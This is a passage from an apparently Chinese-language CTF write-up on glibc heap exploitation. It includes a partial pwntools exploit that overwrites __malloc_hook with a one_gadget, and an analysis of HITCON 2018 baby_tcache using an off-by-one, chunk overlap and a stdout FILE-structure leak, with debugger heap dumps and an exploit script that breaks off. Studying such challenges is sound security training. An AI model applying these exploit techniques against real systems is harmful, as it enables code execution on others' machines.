        one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
        one_gadget = libc_base + one_gadget[1]
        print "one_gadget = " +hex(one_gadget)
        new(0x28, 'B')      # 2
        delete(2)
        delete(0)
        new(0x28, p64(malloc_hook))
        new(0x28, p64(malloc_hook))
        new(0x28, p64(one_gadget))
        menu(1)
        io.interactive()
    if __name__ == '__main__':
        pwn(ip, port, 1)
最后再次调用malloc的时候坑了我...我直接new，会进入one_gadget，当然recv不到"Data:"...我就那么调试好久不知道错在哪了...只选择一下new就行了。
做题的时候还看到别人写了一个工具找偏移的[main_arena](https://github.com/bash-c/main_arena_offset)，他的脚本还需要再改一下才能同时打印出`__malloc_hook_offset`，其实可以直接elf.symbols直接找，不过都行
都行 d=====(￣▽￣*)b
## ▲[HITCON2018
baby_tcache](https://github.com/mathboy7/CTF-2/blob/master/Hitcon-2018/Pwn/BabyTcache/problem/baby_tcache-9ef70fb45e455f8374881f68121c3e0d.tar.gz)
### 分析
保护全开  
菜单
    $   1. New heap           $
    $   2. Delete heap        $ 
    $   3. Exit               $
new heap中存在漏洞`NULL byte off-by-one`  
  1. 由于本身没有带show函数，所以泄露比较困难，程序中有调用puts，我们考虑调用puts进行泄露。  
puts（`_IO_new_file_overflow` -> `_IO_do_write`）会将缓冲区中的数据打印出来（`_IO_write_base`
~ `_IO_write_ptr`）  
调用puts会调用：
        int
    _IO_new_file_overflow (_IO_FILE *f, int ch)
    {
    if (f->_flags & _IO_NO_WRITES) 
     {
       f->_flags |= _IO_ERR_SEEN;
       __set_errno (EBADF);
       return EOF;
     }
    /* If currently reading or no buffer allocated. */
    if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
     {
       :
       :
     }
    if (ch == EOF)
     return _IO_do_write (f, f->_IO_write_base,  // 需要调用的目标，如果使得 _IO_write_base _IO_write_ptr - f->_IO_write_base);
需要满足`f->_flags & _IO_NO_WRITES = 0`和`f->_flags & _IO_CURRENTLY_PUTTING != 0`
        static
    _IO_size_t
    new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
    {
    _IO_size_t count;
    if (fp->_flags & _IO_IS_APPENDING)  /* 需要满足 */
     /* On a system without a proper O_APPEND implementation,
        you would need to sys_seek(0, SEEK_END) here, but is
        not needed nor desirable for Unix- or Posix-like systems.
        Instead, just indicate that offset (before and after) is
        unpredictable. */
     fp->_offset = _IO_pos_BAD;
    else if (fp->_IO_read_end != fp->_IO_write_base)
     {
       _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
       if (new_pos == _IO_pos_BAD)
         return 0;
       fp->_offset = new_pos;
     }
    count = _IO_SYSWRITE (fp, data, to_do); // 这里真正进行 write
需要满足`fp->_flags & _IO_IS_APPENDING != 0` 或 `fp->_IO_read_end !=
fp->_IO_write_base`，我们不能完全控制`fp->_IO_write_base -fp->_IO_read_end`的值，所以控制第一个if就可以了。  
综上：
        _flags = 0xfbad0000 
    _flags & = _IO_NO_WRITES = 0        // _flags = 0xfbad0000 
    _flags & _IO_CURRENTLY_PUTTING = 1  // _flags = 0xfbad0800
    _flags & _IO_IS_APPENDING = 1       // _flags = 0xfbad1800
`_IO_SYSWRITE (fp, data, to_do)`即 `_IO_SYSWRITE (f, f->_IO_write_base,
f->_IO_write_ptr - f->_IO_write_base)`  
我们将`_IO_write_base`的低一个字节覆盖为`\x08`，因为这个地方存放了`_IO_stdfile_2_lock`的地址，而这个地址比`__free_hook`的地址低`0x38`个字节，因此泄露出来后，即可以算出libc基址
如何将chunk分配到 `_IO_2_1_stdout_` 从而进行改写呢？  
`_IO_2_1_stdout_`
文件流地址和`&main_arena+88`的地址后1.5个字节是不会变的，因为系统分配内存是按页分配的，一页的大小为0x1000，他们本身的偏移不会改变，所以后1.5字节是不会变的，但是我们覆盖内存的最小单位是2字节，所以有半字节是猜的，需要我们进行调试，拿到那半个字节，就可以将chunk分配到
`_IO_2_1_stdout_` 文件流内存中，进而覆盖其中的数据。  
【不明白的可以先了解一下 新版本glibc下IO_FILE的利用】
>
> [对于setbuf和setvbuf](https://blog.csdn.net/Albinzhiyu/article/details/6561739):  
>  设置文件缓冲区函数  
>  `void setbuf(FILE *stream,char *buf);`  
>  `void setvbuf(FILE *stream,char *buf,int type,unsigned size);`  
>  这两个函数将使得打开文件后，用户可建立 **自己的文件缓冲区** ，而 **不使用** fopen()函数打开文件设定的默认缓冲区。  
>
> 对于setbuf()函数，buf指出的缓冲区长度由头文件stdio.h中定义的宏BUFSIZE的值决定，缺省值为512字节。当选定buf为空时，setbuf函数将使的文件I/O
> **不带缓冲** 。而对setvbuf函数，则 **由malloc函数来分配缓冲区**
> 。参数size指明了缓冲区的长度(必须大于0),而参数type则表示了缓冲的类型，其值可以取如下值：  
>  type 值 含义  
>  _IOFBF 文件全部缓冲，即缓冲区装满后，才能对文件读写  
>  _IOLBF 文件行缓冲，即缓冲区接收到一个换行符时，才能对文件读写  
>  _IONBF 文件不缓冲，此时忽略buf,size的值，直接读写文件，不再经过文件缓冲区缓冲
由于程序开头就使用了setvbuf，没有缓冲区，所以我们需要伪造flag使stdout文件流认为有缓冲区，同时将`_IO_write_base`指针进行修改，从而泄露libc
base
  1. 同上题一样改写`__malloc_hook`或`__free_hook`就可以了。改写malloc_hook失败，改了free_hook...这里我不明白为什么失败了求指教。
* * *
调试分析一下  
首先构造overlap造成堆块重叠  
申请chunk，并改写chunk5的prev_size
    0x555555757250: 0x0000000000000000  0x0000000000000501    # 0
    0x555555757260: 0x000000000000306b  0x0000000000000000
    0x555555757270: 0x0000000000000000  0x0000000000000000
    0x555555757280: 0x0000000000000000  0x0000000000000000
    .......
    0x555555757750: 0x0000000000000000  0x0000000000000041    # 1
    0x555555757760: 0x000000000000316b  0x0000000000000000
    0x555555757770: 0x0000000000000000  0x0000000000000000
    0x555555757780: 0x0000000000000000  0x0000000000000000
    0x555555757790: 0x0000000000000000  0x0000000000000051    # 2
    0x5555557577a0: 0x000000000000326b  0x0000000000000000
    0x5555557577b0: 0x0000000000000000  0x0000000000000000
    0x5555557577c0: 0x0000000000000000  0x0000000000000000
    0x5555557577d0: 0x0000000000000000  0x0000000000000000
    0x5555557577e0: 0x0000000000000000  0x0000000000000061    # 3
    0x5555557577f0: 0x000000000000336b  0x0000000000000000
    0x555555757800: 0x0000000000000000  0x0000000000000000
    .......
    0x555555757840: 0x0000000000000000  0x0000000000000071    # 4
    0x555555757850: 0x6161616161616161  0x6161616161616161
    0x555555757860: 0x6161616161616161  0x6161616161616161
    0x555555757870: 0x6161616161616161  0x6161616161616161
    0x555555757880: 0x6161616161616161  0x6161616161616161
    0x555555757890: 0x6161616161616161  0x6161616161616161
    0x5555557578a0: 0x6161616161616161  0x6161616161616161
    0x5555557578b0: 0x0000000000000660  0x0000000000000500    # 5   【同时，新申请的 4 改写了prev_size和prev_inuse】
    0x5555557578c0: 0x000000000000356b  0x0000000000000000
    0x5555557578d0: 0x0000000000000000  0x0000000000000000
    .......
    0x555555757db0: 0x0000000000000000  0x0000000000000081    # 6
    0x555555757dc0: 0x000000000000366b  0x0000000000000000
    0x555555757dd0: 0x0000000000000000  0x0000000000000000
    0x555555757de0: 0x0000000000000000  0x0000000000000000
    .......                                                        # top chunk
释放chunk2 chunk0 chunk5  
这样呢 chunk5 向前索引就到了 chunk0，chunk0和chunk5 空闲unsorted合并，所以 chunk0 的 size = 0x660
+ 0x500 = 0xb60，实现了overlap
    0x555555757250: 0x0000000000000000  0x0000000000000b61    # 0
    0x555555757260: 0x00007ffff7dcfca0  0x00007ffff7dcfca0
    0x555555757270: 0x0000000000000000  0x0000000000000000
    0x555555757280: 0xdadadadadadadada  0xdadadadadadadada
    .......
    0x555555757750: 0x0000000000000500  0x0000000000000040    # 1
    0x555555757760: 0x000000000000316b  0x0000000000000000
    0x555555757770: 0x0000000000000000  0x0000000000000000
    0x555555757780: 0x0000000000000000  0x0000000000000000
    0x555555757790: 0x0000000000000000  0x0000000000000051    # 2
    0x5555557577a0: 0x0000000000000000  0xdadadadadadadada
    0x5555557577b0: 0xdadadadadadadada  0xdadadadadadadada
    0x5555557577c0: 0xdadadadadadadada  0xdadadadadadadada
    0x5555557577d0: 0xdadadadadadadada  0xdadadadadadadada
    0x5555557577e0: 0x0000000000000000  0x0000000000000061    # 3
    0x5555557577f0: 0x000000000000336b  0x0000000000000000
    0x555555757800: 0x0000000000000000  0x0000000000000000
    .......
    0x555555757840: 0x0000000000000000  0x0000000000000071    # 4
    0x555555757850: 0x6161616161616161  0x6161616161616161
    0x555555757860: 0x6161616161616161  0x6161616161616161
    0x555555757870: 0x6161616161616161  0x6161616161616161
    0x555555757880: 0x6161616161616161  0x6161616161616161
    0x555555757890: 0x6161616161616161  0x6161616161616161
    0x5555557578a0: 0x6161616161616161  0x6161616161616161
    0x5555557578b0: 0x0000000000000660  0x0000000000000500    # 5   【同时，新申请的 chunk4 利用复写 改写了prev_size = 0xb0-0x6=250和prev_inuse】
    0x5555557578c0: 0xdadadadadadadada  0xdadadadadadadada
    0x5555557578d0: 0xdadadadadadadada  0xdadadadadadadada
    .......
    0x555555757db0: 0x0000000000000b60  0x0000000000000080    # 6
    0x555555757dc0: 0x000000000000366b  0x0000000000000000
    0x555555757dd0: 0x0000000000000000  0x0000000000000000
    0x555555757de0: 0x0000000000000000  0x0000000000000000
    .......                                                        # top chunk
### exp
    #!usr/bin/python
    from pwn import *
    # context.log_level = 'debug'
    binary = "./baby_tcache"
    ip = ""
    port = 0
    elf = ELF(binary)
    def menu(choice):
        io.sendlineafter("choice: ", str(choice))
    def new(size, data):
        menu(1)
        io.sendlineafter("Size:", str(size))
        io.sendafter("Data:", data)
    def delete(index):
        menu(2)
        io.sendlineafter("Index:", str(index))
    def pwn(ip, port, debug):
        global io
        if debug == 1:
            io = process(binary)
            libc = ELF("./libc.so.6")   
        else:
            io = remote(ip, port)
            libc = 0
        new(0x500-0x8, "k0")    # 0
        new(0x30, "k1")         # 1
        new(0x40, "k2")         # 2
        new(0x50, "k3")         # 3
        new(0x60, "k4")         # 4
        new(0x500-0x8, "k5")    # 5
        new(0x10, "k6")         # 6     # gap to top chunk
        delete(4)
        new(0x68, 'a' * 0x60 + '\x60\x06')      # 4     # 0x660
        delete(2)